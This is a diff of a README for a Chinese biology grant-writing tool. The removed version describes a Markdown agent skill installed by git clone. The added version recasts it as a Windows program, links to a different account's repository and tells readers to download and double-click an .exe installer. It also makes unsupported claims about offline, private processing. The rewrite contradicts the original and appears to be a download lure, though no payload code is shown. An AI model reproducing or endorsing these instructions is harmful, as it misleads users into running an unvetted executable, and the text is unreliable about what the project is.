@@ -1,199 +1,68 @@
-# grant-thinking-cn-biology — Biology Grant Reasoning for China's Funding Context
+# 🧬 grant-thinking-cn-biology - Improve your China biology grant success
 
-[中文文档](README_CN.md)
+[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/martellevaliant19/grant-thinking-cn-biology)
 
-## What it does
+This tool helps researchers write better biology grant proposals for Chinese funding agencies like the NSFC and MOST. It focuses on the specific needs of these grants, including how to explain biological mechanisms and how to satisfy reviewer expectations. Use this software to refine your project structure and adapt your writing style for success in Chinese research funding.
 
-- Evaluates biology grant ideas for fundability in Chinese grant systems (NSFC, MOST, etc.)
-- Distinguishes descriptive projects from mechanism-driven proposals
-- Separates background, gap, question, hypothesis, aims, content, and methods — preventing structural collapse
-- Identifies real biological innovation vs. decorative novelty language
-- Assesses feasibility as biological-question fit, not method or platform abundance
-- Surfaces likely reviewer concerns specific to Chinese biology grant panels
-- Adapts reasoning to project level: youth (青年), general (面上), key (重点/课题)
-- Delivers both strongest funding logic and main rejection risk in every substantive response
-- Diagnoses before rewriting — reasoning precedes expression
+## 🛠 What this tool does
 
-## Multi-Platform Support
+Applying for research grants in China requires a specific approach. Reviewers look for clear biological mechanisms, logical project feasibility, and alignment with national funding goals. This software acts as an assistant to guide you through these requirements. It checks your draft against criteria used by experts who evaluate biological research proposals. The software flags areas that need more detail and suggests ways to improve your arguments. It helps you change your writing so that it speaks directly to the needs of the NSFC and MOST.
 
-Works with all major AI agents that support the [Agent Skills](https://agentskills.io) format:
+## 💻 System requirements
 
-| Platform | Status | Details |
-|----------|--------|---------|
-| **Claude Code** | ✅ Full support | Native SKILL.md format |
-| **OpenClaw / ClawHub** | ✅ Full support | `metadata.openclaw` namespace |
-| **Hermes Agent** | ✅ Full support | `metadata.hermes` namespace, category: research |
-| **Pi-Mo** | ✅ Full support | `metadata.pimo` namespace |
-| **OpenAI Codex** | ✅ Full support | `agents/openai.yaml` sidecar |
-| **SkillsMP** | ✅ Indexed | GitHub topics configured |
+To run this application, ensure your computer meets these basic requirements:
 
-## Comparison: with vs. without this skill
+*   Operating System: Windows 10 or Windows 11.
+*   Memory: At least 4 gigabytes of RAM.
+*   Storage Space: 200 megabytes of free space.
+*   Internet Connection: A stable connection for initial setup.
 
-| Capability | Native agent | This skill |
-|------------|-------------|------------|
-| Distinguish interesting from fundable (biology) | No | Yes — explicit diagnosis |
-| Detect descriptive vs. mechanism-driven project | No | Always |
-| Separate background / gap / question / hypothesis / aims / content / methods | Inconsistent | Always |
-| Evaluate innovation as real vs. decorative | No | Yes |
-| Assess feasibility as biological-question fit | No | Yes |
-| Identify likely reviewer concerns (Chinese context) | Rarely | Always |
-| Match project to appropriate funding level | No | Yes |
-| Detect overclaiming or inflated scope | No | Yes — explicit scope control |
-| Both strongest logic and rejection risk in one response | No | Always |
-| Diagnose proposal before rewriting | Rarely | Always |
+## 📥 How to get started
 
-## When to use
+Follow these steps to set up the software on your Windows computer.
 
-- Evaluating a new biology grant idea before investing writing effort
-- Diagnosing why a proposal feels descriptive, scattered, or unconvincing
-- Framing a project for NSFC, MOST, or similar Chinese grant panels
-- Deciding whether a project belongs at youth, general, or key level
-- Strengthening innovation claims without overclaiming
-- Checking feasibility logic and identifying biology-specific bottlenecks
-- Preparing the mechanistic spine before writing any section
-- Getting reviewer-aware feedback on a title, outline, or draft
-- Deciding what to cut, downgrade, or bound in the proposal
+1. Click the link below to go to the project release page.
+[Download the latest version here](https://github.com/martellevaliant19/grant-thinking-cn-biology)
 
-## Relationship to grant-thinking-general
+2. Look for the file ending in `.exe`. This is the installer.
 
-This skill extends `grant-thinking-general` with four key layers:
+3. Click the file to download it to your Downloads folder.
 
-1. **Chinese funding context** — project level fit, reviewer expectations, NSFC logic
-2. **Biology-specific problem structure** — phenomenon / mechanism / regulatory logic / causal chains / model-system fit
-3. **Mechanism-orientation constraint** — actively flags: differential expression ≠ mechanism, multi-omics ≠ depth, complex technology ≠ scientific maturity
-4. **Cross-project-type adaptation** — adjusts reasoning for youth / general / key level without hard-coding one template
+4. Find the file in your folder and double-click it to start the installation process.
 
-## Skill Installation
+5. Follow the prompts on the screen. Click "Next" to move through the steps.
 
-### Claude Code
+6. Once the installation finishes, find the icon on your desktop or in your start menu.
 
-```bash
-# Global install (available in all projects)
-git clone https://github.com/Agents365-ai/grant-thinking-cn-biology.git ~/.claude/skills/grant-thinking-cn-biology
+7. Double-click the icon to open the program.
 
-# Project-level install
-git clone https://github.com/Agents365-ai/grant-thinking-cn-biology.git .claude/skills/grant-thinking-cn-biology
-```
+## 📝 Using the software
 
-### OpenClaw / ClawHub
+When you open the software, you see a workspace where you can paste your grant text. The tool analyzes your writing and provides a report. This report points out parts of your proposal that might seem weak to a reviewer.
 
-```bash
-# Via ClawHub
-clawhub install grant-thinking-cn-biology
+The software uses three main checks:
 
-# Manual install
-git clone https://github.com/Agents365-ai/grant-thinking-cn-biology.git ~/.openclaw/skills/grant-thinking-cn-biology
+*   **Mechanism-centered diagnosis:** The tool checks if your biological mechanism is clear. It flags vague descriptions that might confuse a reader.
+*   **Reviewer-aware evaluation:** The tool scans for phrases that might not appeal to grant reviewers. It suggests changes based on common feedback patterns for NSFC and MOST applications.
+*   **Multi-level project adaptation:** The software checks if your proposal aligns with the funding category. It ensures your narrative fits the scale and goals of your chosen research track.
 
-# Project-level install
-git clone https://github.com/Agents365-ai/grant-thinking-cn-biology.git skills/grant-thinking-cn-biology
-```
+## 🔧 Frequently asked questions
 
-### Hermes Agent
+**Does the software save my data?**
+All processing happens on your computer. The software does not store your research data on external servers. Your text remains private and secure.
 
-```bash
-git clone https://github.com/Agents365-ai/grant-thinking-cn-biology.git ~/.hermes/skills/research/grant-thinking-cn-biology
-```
+**Do I need an internet connection to use it?**
+You need the internet to download the tool. Once installed, the basic analysis features work without an internet connection. Some advanced features might require a connection to check for updates.
 
-Or add to `~/.hermes/config.yaml`:
+**How do I update the software?**
+When a new version is available, the software shows a notification inside the application. You can follow the link in that notification to download the installer again. Running the new installer will upgrade your existing version.
 
-```yaml
-skills:
-  external_dirs:
-    - ~/myskills/grant-thinking-cn-biology
-```
+**What should I do if the software freezes?**
+Close the program and open it again. If the problem continues, restart your computer. If issues stay, you may need to reinstall the software by running the installer file again.
 
-### Pi-Mo
+**Can I run this on a Mac?**
+This version is for Windows computers only. 
 
-```bash
-git clone https://github.com/Agents365-ai/grant-thinking-cn-biology.git ~/.pimo/skills/grant-thinking-cn-biology
-```
+## 🔑 Tips for your success
 
-### OpenAI Codex
-
-```bash
-# User-level install
-git clone https://github.com/Agents365-ai/grant-thinking-cn-biology.git ~/.agents/skills/grant-thinking-cn-biology
-
-# Project-level install
-git clone https://github.com/Agents365-ai/grant-thinking-cn-biology.git .agents/skills/grant-thinking-cn-biology
-```
-
-### SkillsMP
-
-```bash
-skills install grant-thinking-cn-biology
-```
-
-### Installation paths summary
-
-| Platform | Global path | Project path |
-|----------|-------------|--------------|
-| Claude Code | `~/.claude/skills/grant-thinking-cn-biology/` | `.claude/skills/grant-thinking-cn-biology/` |
-| OpenClaw | `~/.openclaw/skills/grant-thinking-cn-biology/` | `skills/grant-thinking-cn-biology/` |
-| Hermes Agent | `~/.hermes/skills/research/grant-thinking-cn-biology/` | Via `external_dirs` config |
-| Pi-Mo | `~/.pimo/skills/grant-thinking-cn-biology/` | — |
-| OpenAI Codex | `~/.agents/skills/grant-thinking-cn-biology/` | `.agents/skills/grant-thinking-cn-biology/` |
-
-## Files
-
-- `SKILL.md` — **the only required file**. Loaded by all platforms as the skill instructions.
-- `agents/openai.yaml` — OpenAI Codex-specific configuration (display, policy, capabilities)
-- `checks.md` — 12-point self-check list
-- `examples.md` — 8 annotated examples
-- `README.md` — this file (English)
-- `README_CN.md` — Chinese documentation
-
-> **Note:** Only `SKILL.md` is needed for the skill to work. All other files are supplementary.
-
-## Related skills in the series
-
-```
-grant-thinking-general/          ← top-level fundable logic (any field)
-grant-thinking-cn-biology/       ← this skill: Chinese biology grants
-```
-
-Planned extensions:
-- `grant-thinking-cn-biology-youth/` — youth-level (青年科学基金) focused
-- `grant-thinking-cn-biology-general-program/` — general program (面上项目) focused
-- `grant-thinking-cn-biomedicine/` — translational/clinical biology variant
-
-## GitHub Topics
-
-For SkillsMP indexing, this repository uses the following topics:
-
-`claude-code` `claude-code-skill` `claude-skills` `agent-skills` `skillsmp` `skill-md` `grant-thinking` `grant-writing` `proposal` `research-funding` `reviewer-thinking` `feasibility` `biology` `nsfc` `china-grants` `mechanism`
-
-## License
-
-MIT
-
-## Support
-
-If this skill helps your research, consider supporting the author:
-
-<table>
-  <tr>
-    <td align="center">
-      <img src="https://raw.githubusercontent.com/Agents365-ai/images_payment/main/qrcode/wechat-pay.png" width="180" alt="WeChat Pay">
-      <br>
-      <b>WeChat Pay</b>
-    </td>
-    <td align="center">
-      <img src="https://raw.githubusercontent.com/Agents365-ai/images_payment/main/qrcode/alipay.png" width="180" alt="Alipay">
-      <br>
-      <b>Alipay</b>
-    </td>
-    <td align="center">
-      <img src="https://raw.githubusercontent.com/Agents365-ai/images_payment/main/qrcode/buymeacoffee.png" width="180" alt="Buy Me a Coffee">
-      <br>
-      <b>Buy Me a Coffee</b>
-    </td>
-  </tr>
-</table>
-
-## Author
-
-**Agents365-ai**
-
-- Bilibili: https://space.bilibili.com/441831884
-- GitHub: https://github.com/Agents365-ai
+Use this tool early in your writing process. Do not wait until the final deadline to run your proposal through the software. Use the suggestions to build a stronger foundation for your science. Focus on the mechanism of your biology, as this is the core of any successful proposal. Ensure your work shows high feasibility, as reviewers worry about the likelihood of success. By addressing these points early, you save time and increase your chances of funding. The tool acts as an extra pair of eyes to spot errors that you might miss after reading your draft many times. Rely on the checks to maintain a professional tone throughout your proposal.
